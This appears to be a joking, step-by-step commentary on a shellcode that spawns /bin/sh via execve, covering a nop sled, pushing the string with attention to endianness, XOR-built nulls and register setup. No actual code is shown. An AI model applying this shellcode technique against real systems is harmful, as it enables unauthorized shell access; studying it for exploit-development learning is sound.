#1: rcx contains the address of the base of the allocated code,we'll use it to write a shellcode
#2: willem dripfoe is moving /bing/us/sh into the rbx, please remember that it wants a ptr to it !!
#3: we're moving the rsp back to the base of our code, big dick strat !
#4: now we're movin it up 0x100, we should crossover the nop sled
#5: we push our "/bin/sh\x00" into the stack, please notice the ENDIANESS
#6: Bing chillin' the ptr to the bin/sh string, one step close to the syscall that I'm boutta break
#7: We create a beautiful null via XORING
#8: We push it to the stack, we have a pointer ladies n gents!
#9 & 10:  We set the null ptr registers
#11: We set the code for the execve
#12: et voil√†!
